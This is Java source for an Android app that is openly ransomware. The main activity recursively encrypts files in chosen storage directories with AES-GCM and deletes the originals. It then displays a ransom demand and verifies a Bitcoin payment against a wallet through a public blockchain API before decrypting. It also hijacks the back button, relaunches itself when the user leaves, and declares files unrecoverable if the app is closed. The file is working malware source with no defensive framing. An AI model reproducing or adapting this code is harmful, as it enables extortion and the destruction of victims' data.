package android.nightmare;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.CookieManager;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class DiversionActivity extends Activity
{
	private HttpsURLConnection conn;
	private Activity me;
	private String USER_AGENT = "Mozilla/5.0";
	private EditText TxID;
	private Button verifyButton;
	final static int REQUEST = 192;
	protected int maximumEncryptFileKBSize = 8000;
	protected CookieManager cm;
	protected List<String> cookies;
	protected TextView log;
    public TextView ammountInfo;
	protected String uniqueSessionToken = "";
	protected Boolean paymentConfirmed = false;
	protected SharedPreferences prefs;
	protected SharedPreferences.Editor editPrefs;
	private SecretKey key;
	private TextView splashLog;
	protected String[] targetDirectories;
	protected String[] targetExtensions;
	protected Boolean impossible;
	protected Boolean testing = false;
	public String[] perms = {android.Manifest.permission.WRITE_EXTERNAL_STORAGE,android.Manifest.permission.READ_EXTERNAL_STORAGE,android.Manifest.permission.INTERNET,android.Manifest.permission.ACCESS_NETWORK_STATE};
	private int all = 0;
	private int allDec = 0;
	private Boolean payOk = false;
	private int logs = 0;
	private int currentResponseCode = 200;
	private String currentUrl;
    private Integer paid;
    public Boolean splashFinished = false;



    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.splash);
		me = this;
		String ts = getString(R.string.testing).toLowerCase();
		if (ts == "yes" | ts == "true" | ts == "1")
        {
			testing = true;
		}

		splashLog = findViewById(R.id.splashLog);
		prefs = getApplicationContext().getSharedPreferences("wowYouTriedReallyHard", MODE_PRIVATE);
		editPrefs = prefs.edit();
		Resources res = getResources();
		targetDirectories = res.getStringArray(R.array.directories);
		targetExtensions = res.getStringArray(R.array.extensions);

        if (uniqueSessionToken == "")
        {
			String key = EncryptionUtility.key2string(EncryptionUtility.generateKeyPair("yougothacked"));
			uniqueSessionToken = key;
		}
		key = EncryptionUtility.string2key(uniqueSessionToken);
		if (hasInternet())
        {
			if (checkSelfPerms(this, perms))
            {
				starter();
			}
		}
		else
        {
			logSplashText(getString(R.string.internet_denied_message));
			new Thread(new Runnable(){
					@Override
					public void run()
                    {
						editPrefs.putBoolean("permsOk", false);
						editPrefs.commit();
						SystemClock.sleep(5000);
						finishAndRemoveTask();
					}
				}).start();
		}

    }

	public boolean hasInternet()
    {
		boolean isWifiConnected = false;
        boolean isMobileConnected = false;
        ConnectivityManager connMgr = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (networkInfo != null) isWifiConnected = networkInfo.isConnected();
        networkInfo = connMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        if (networkInfo != null) isMobileConnected = networkInfo.isConnected();

        if (!isWifiConnected & ! isMobileConnected)
        {
            return false;
        }
		return true;
	}



	private void starter()
    {
		new Thread(new Runnable(){
				@Override
				public void run()
                {
					impossible = prefs.getBoolean("impossible", false);

					if (paymentConfirmed == false & ! impossible)
                    {
						try
                        {

                            startEncrypt(targetDirectories, targetExtensions);

						}
						catch (Error e)
                        {
							notifyText(e.getMessage());
						}
					}

					if (testing & ! impossible)
                    {
						SystemClock.sleep(3000);
					}
					me.runOnUiThread(new Runnable(){
							@Override
							public void run()
                            {
								setContentView(R.layout.main);
								log = findViewById(R.id.log);
								TxID = findViewById(R.id.txid);
                                splashFinished = true;
                                verifyButton = findViewById(R.id.verifyBotton);
								if (impossible)
                                {
									editButton(verifyButton, getString(R.string.decryption_impossible_notice), false);
									logText(getString(R.string.decryption_impossible_message));
									killer();
								}
								else
                                {
									notifyText(getString(R.string.pwned_message));
									logText(getString(R.string.encrypted_log_message) + " : " + all);
								}
                                ammountInfo = findViewById(R.id.amountInfo);
                                String dat = getString(R.string.step1) + " " + getString(R.string.ransom_amount) + " " + getString(R.string.steptype) + " " + getString(R.string.stepend);
                                ammountInfo.setText(dat);
                                notifyText(storagePath());


							}
						});
				}
			}).start();
	}

	private void startEncrypt(String[] directories, String[] types)
    {
        int dirs = directories.length;
        int now = 0;
		for (String directory: directories)
        {
            logSplashText(getString(R.string.encrypting_files_started_log_message) + "\n" + (now++) + "/" + dirs);
            File tmp = new File(storagePath() + "/" + directory);
			if (tmp.isDirectory() && tmp.exists())
            {
				for (String type: types)
                {
					encryptFiles(type, directory);
				}
			}
		}
	}

	private void startDecrypt(String[] directories, String[] types)
    {
        int dirs = directories.length;
        int now = 0;
		for (String directory: directories)
        {
            logText(getString(R.string.decrypting_files_started_log_message) + " " + (now++) + "/" + dirs);
			File tmp = new File("sdcard/" + directory);
			if (tmp.isDirectory() && tmp.exists())
            {
				for (String type: types)
                {
					decryptFiles(type, directory);
				}
			}
		}
	}

	private String encExt()
    {
		return getString(R.string.encryption_extension);
	}


	private byte[] encryptBytes(byte[] data) throws Exception
    {
		return EncryptionUtility.encryptData(key, data);
	}


	private byte[] decryptBytes(byte[] data) throws Exception
    {
		return EncryptionUtility.decryptData(key, data);
	}


	private void encryptFiles(String fileType, String folder)
    {
		String path = storagePath() + "/" + folder;
		File directory = new File(path);
		List<String> result = new ArrayList<>();
		search(".*\\." + fileType, directory, result);
		int now = 0;
		for (String s : result)
        {
			now++;
			all++;
            if (!testing)
            {
                File tmp = new File(s);
                int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
                if (maximumEncryptFileKBSize >= file_kb)
                {
                    logSplashText(getString(R.string.splash_encrypt_message) + " " + now + "/" + result.size());
                    try
                    {
                        writeFile(tmp.getAbsolutePath() + "." + encExt(), encryptBytes(readFile(tmp.getAbsolutePath())));
                        tmp.delete();
                    }
                    catch (Exception e)
                    {
                        notifyText(e.getMessage());
                    }
                }
                else
                {
                    tmp.renameTo(new File(tmp.getParent(), tmp.getName() + "." + encExt()));
                }
            }
		}
	}

    public String storagePath()
    {
        return "sdcard";
    }

	private void decryptFiles(String fileType, String folder)
    {
		String path = storagePath() + "/" + folder;
		File directory = new File(path);
		List<String> result = new ArrayList<>();
		search(".*\\." + fileType + "." + encExt(), directory, result);
		for (String s : result)
        {

			allDec++;
            if (!testing)
            {
                File tmp = new File(s);
                tmp.setReadable(true);
                tmp.setWritable(true);
                logText(getString(R.string.log_decrypted_file_message) + " : " + allDec + "/" + all + " : " + tmp.getName());
                int file_kb = Integer.parseInt(String.valueOf(tmp.length() / 1024));
                if (maximumEncryptFileKBSize >= file_kb)
                {
                    try
                    {
                        writeFile(tmp.getAbsolutePath().replaceAll("." + encExt(), ""), decryptBytes(readFile(tmp.getAbsolutePath())));
                        tmp.delete();
                    }
                    catch (Exception e)
                    {
                        tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
                    }
                }
                else
                {
                    tmp.renameTo(new File(tmp.getParent(), tmp.getName().replace("." + encExt(), "")));
                }
            }
		}
	}


    protected static void search(final String pattern, final File folder, List<String> result)
    {
        for (final File f : folder.listFiles())
        {
            if (f.isDirectory())
            {
                search(pattern, f, result);
            }
            if (f.isFile())
            {
                if (f.getName().matches(pattern))
                {
                    result.add(f.getAbsolutePath());
                }
            }

        }
    }
	public Boolean checkSelfPerms(Context ctx, String [] PERMISSIONS)
    {
        if (Build.VERSION.SDK_INT >= 23)
        {
            if (!hasPermissions(ctx, PERMISSIONS))
            {
                ActivityCompat.requestPermissions((Activity) ctx, PERMISSIONS, REQUEST);
            }
			else
            {
				return true;
            }
        }
		else
        {
            return true;
        }
		ActivityCompat.requestPermissions((Activity) ctx, PERMISSIONS, REQUEST);
		return false;
    }

	protected byte[] readFile(String path)
    {
		File file = new File(path);
		byte [] fileData = new byte[(int) file.length()];
		try
        {
			try(FileInputStream fileInputStream = new FileInputStream(file)) {
				fileInputStream.read(fileData);
			}
		}
		catch (IOException e)
        {}
		return fileData;
	}

	protected static void writeFile(String path, byte [] data) throws IOException
    {
        try(FileOutputStream fileOutputStream = new FileOutputStream(path)) {
            fileOutputStream.write(data);
        }
    }

	public void notifyText(final String msg)
    {
		me.runOnUiThread(new Runnable(){
				@Override
				public void run()
                {
					Toast.makeText(me.getApplicationContext(), msg, Toast.LENGTH_LONG).show();
				}
			});
	}

    private static boolean hasPermissions(Context context, String... permissions)
    {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && context != null && permissions != null)
        {
            for (String permission : permissions)
            {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED)
                {
                    return false;
                }
            }
        }
        return true;
    }

	Boolean permsOk()
    {
		return prefs.getBoolean("permsOk", false);
	}
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults)
    {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode)
        {
            case REQUEST: {
					if (grantResults.length > 0)
                    {
						if (grantResults[0] == PackageManager.PERMISSION_GRANTED && hasInternet())
                        {
							editPrefs.putBoolean("permsOk", true);
							editPrefs.commit();
							starter();
						}
						else
                        {

							logSplashText(getString(R.string.permission_denied_message));
							new Thread(new Runnable(){
									@Override
									public void run()
                                    {
										editPrefs.putBoolean("permsOk", false);
										editPrefs.commit();
										SystemClock.sleep(5000);
										finishAndRemoveTask();
									}
								}).start();


						}
					}
                }
        }
    }




	public void verify(View view)
    {
		final String txid = TxID.getText().toString();
		if (paymentConfirmed != true)
        {
			editButton(verifyButton, getString(R.string.verify_payment_button_text), false);
			new Thread(new Runnable(){
					@Override
					public void run()
                    {
						try
                        {
							int result = checkPayment(txid, getString(R.string.wallet_address));
							if (result == 201)
                            {
								payOk = true;
								logText(getString(R.string.log_payment_successful));
								editButton(verifyButton, getString(R.string.decrypting_button_text), false);
								paymentConfirmed = true;
								logText(getString(R.string.decrypting_button_text));

                                startDecrypt(targetDirectories, targetExtensions);

                                logText(all + " " + getString(R.string.log_decrypting_finished_message) + "\n");
								editButton(verifyButton, getString(R.string.decrypting_finished_button_text), false);
								killer();
							}
							else if (result == 200)
                            {
								editButton(verifyButton, getString(R.string.transaction_pending_button_text), true);
								logText(getString(R.string.transaction_pending_log_message));
							}
                            else if (result == 202)
                            {

                                editButton(verifyButton, getString(R.string.transaction_pending_button_text), true);
                                logText(getString(R.string.transaction_low_log_message) + " " + String.valueOf(paid) + "/" + getString(R.string.ransom_amount) + "");
                            }
							else
                            {
								editButton(verifyButton, getString(R.string.transaction_incorrect_button_text), true);
								logText(getString(R.string.transaction_incorrect_log_message));
							}
						}
						catch (Exception e)
                        {
							logText(getString(R.string.transaction_server_connection_failure_log_message));
							editButton(verifyButton, getString(R.string.verify_payment_button_text), true);
						}

					}
				}).start();
		}
		else
        {
			editButton(verifyButton, getString(R.string.decrypting_button_text), false);
			logText(getString(R.string.decrypting_files_started_log_message));

            startDecrypt(targetDirectories, targetExtensions);

            logText(all + " " + getString(R.string.log_decrypting_finished_message) + "\n");
            editButton(verifyButton, getString(R.string.decrypting_finished_button_text), false);
		}
	}

	public boolean killing = false;
	public void killer()
    {
		notifyText("UNINSTALL ME");
		killing = true;
		new Thread(new Runnable(){
				@Override
				public void run()
                {
					SystemClock.sleep(3000);
					editPrefs.putBoolean("impossible", true);
					editPrefs.commit();
					//finishAndRemoveTask();
				}
			}).start();
        Intent intent = new Intent(Intent.ACTION_DELETE);
        intent.setData(Uri.parse("package:" + this.getOpPackageName()));
        startActivity(intent);
	}


	public void logSplashText(final String msg)
    {
		me.runOnUiThread(new Runnable(){
				@Override
				public void run()
                {
					splashLog.setText(msg);
				}
			});
	}

	public void logText(final String msg)
    {
		me.runOnUiThread(new Runnable(){
				@Override
				public void run()
                {
					logs++;
					if (logs < 5)
                    {
						log.setText(msg + "\n" + log.getText().toString());
					}
					else
                    {
						log.setText(msg);
						logs = 0;
					}

				}
			});
	}


	public void editButton(final Button button, final String text, final Boolean enabled)
    {
		me.runOnUiThread(new Runnable(){
				@Override
				public void run()
                {
					button.setText(text);
					button.setEnabled(enabled);
				}
			});
	}

	private int checkPayment(String TxiD, String address) throws Exception,Error
    {
		// String url = getString(R.string.payment_server_https_url) + "/?txid=" + TxiD + "&verifyAmount=true&amount=" + getString(R.string.ransom_amount) + "&verifyReceiver=true&receiver=" + getString(R.string.wallet_address);

        String url = "https://api.blockcypher.com/v1/btc/main/txs/" + TxiD + "?limit=50&includeHex=true";
        String testRecAdd = address;
        String data = GetPageContent(url);
        try
        {
            JSONObject jsonResponse = new JSONObject(data);
            JSONArray addresses = jsonResponse.getJSONArray("addresses");
            String sender = addresses.getString(0);
            String receiver = addresses.getString(1);
            int confirmations = jsonResponse.getInt("confirmations");
            String confidence = jsonResponse.getString("confidence");
            int total = jsonResponse.getInt("total");
            String fees = jsonResponse.getString("fees");
            String dateConfirmed = jsonResponse.getString("confirmed");

            if (confirmations > 4 && (receiver.equals(getString(R.string.wallet_address))))
            {
                if ((total >= Integer.parseInt(getString(R.string.ransom_amount))))
                {
                    return 201;
                }
                else
                {
                    paid = total;
                    return 202;
                }

            }
            else
            {
                return 200;
            }

        }
        catch (JSONException e)
        {
            // TODO Auto-generated catch block
            logText(e.getMessage());
        }

		return 300;
	}

	private String GetPageContent(String url) throws Exception
    {
		URL obj = new URL(url);
		conn = (HttpsURLConnection) obj.openConnection();
		conn.setRequestMethod("GET");
		conn.setUseCaches(false);
		conn.setConnectTimeout(15000);
		conn.setReadTimeout(15000);
		conn.setRequestProperty("User-Agent", USER_AGENT);
		conn.setRequestProperty("Accept",
								"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		conn.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
		if (cookies != null)
        {
			for (String cookie : this.cookies)
            {
				conn.addRequestProperty("Cookie", cookie.split(";", 1)[0]);
			}
		}
		int responseCode = conn.getResponseCode();
		currentResponseCode = responseCode;
		BufferedReader in = 
            new BufferedReader(new InputStreamReader(conn.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while ((inputLine = in.readLine()) != null)
        {
			response.append(inputLine);
		}
		in.close();
		currentUrl = conn.getURL().toString();
		setCookies(conn.getHeaderFields().get("Set-Cookie"));
		return response.toString();
	}

	@Override
	public void onBackPressed()
    {
		if (permsOk() & ! impossible)
        {
	    	notifyText(getString(R.string.tried_to_use_back_button_message));
		}
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event)
    {
		if (keyCode == KeyEvent.KEYCODE_BACK)
        {
			if (permsOk() & ! impossible & ! killing)
            {
                if (splashFinished)
                {
                    notifyText(getString(R.string.tried_to_use_back_button_message));
                }
			}
			return false;
		}
		return onKeyDown(keyCode, event);
	}

	@Override
	protected void onDestroy()
    {
		if (permsOk() & ! impossible)
        {
			if (!killing)
            {
				notifyText(getString(R.string.app_closed_key_destroyed_message));
			}
			editPrefs.putBoolean("impossible", true);
			editPrefs.commit();
		}
		super.onDestroy();
	}

	@Override
	public void onWindowFocusChanged(boolean hasFocus)
    {
		if (!hasFocus && permsOk() & ! impossible & ! killing)
        {
            if (splashFinished)
            {
                notifyText(getString(R.string.return_to_the_app_message));
            }
            PackageManager pm = this.getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(this.getPackageName());
            startActivity(intent);
		}
		super.onWindowFocusChanged(hasFocus);
	}


	public List<String> getCookies()
    {
		return cookies;
	}

	public void setCookies(List<String> cookies)
    {
		this.cookies = cookies;
	}

}







class EncryptionUtility
{
    protected static byte [] encryptData(SecretKey key, byte [] data) throws Exception
    {
        SecureRandom secureRandom = new SecureRandom();
        byte[] iv = new byte[12];
        secureRandom.nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);
        byte [] encryptedData = cipher.doFinal(data);
        ByteBuffer byteBuffer = ByteBuffer.allocate(4 + iv.length + encryptedData.length);
        byteBuffer.putInt(iv.length);
        byteBuffer.put(iv);
        byteBuffer.put(encryptedData);
        return byteBuffer.array();
	}
	public static String key2string(SecretKey key)
    {
		String encodedKey = Base64.getEncoder().encodeToString(key.getEncoded());
		return encodedKey;
	}
	public static SecretKey string2key(String strKey)
    {
		byte[] decodedKey = Base64.getDecoder().decode(strKey);
		SecretKey originalKey = new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES"); 
		return originalKey;
	}
    protected static byte [] decryptData(SecretKey key, byte [] encryptedData) 
	throws Exception
    {
		ByteBuffer byteBuffer = ByteBuffer.wrap(encryptedData);
        int noonceSize = byteBuffer.getInt();
        if (noonceSize < 12 || noonceSize >= 16)
        {
            throw new IllegalArgumentException("Nonce size is incorrect. Make sure that the incoming data is an AES encrypted file.");
        }
        byte[] iv = new byte[noonceSize];
        byteBuffer.get(iv);
        byte[] cipherBytes = new byte[byteBuffer.remaining()];
        byteBuffer.get(cipherBytes);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, key, parameterSpec);
        return cipher.doFinal(cipherBytes);
    }
    protected static SecretKey generateSecretKey(String password, byte [] iv) throws NoSuchAlgorithmException, InvalidKeySpecException
    {
        KeySpec spec = new PBEKeySpec(password.toCharArray(), iv, 65536, 128); 
        SecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        byte[] key = secretKeyFactory.generateSecret(spec).getEncoded();
        return new SecretKeySpec(key, "AES");
    }
	protected static SecretKey generateKeyPair(String password)
    {
        SecureRandom secureRandom = new SecureRandom();
        byte[] iv = new byte[12];
        secureRandom.nextBytes(iv);
		try
        {
			return generateSecretKey(password, iv);
		}
		catch (NoSuchAlgorithmException e)
        {}
		catch (InvalidKeySpecException e)
        {}
		return null;
	}
}

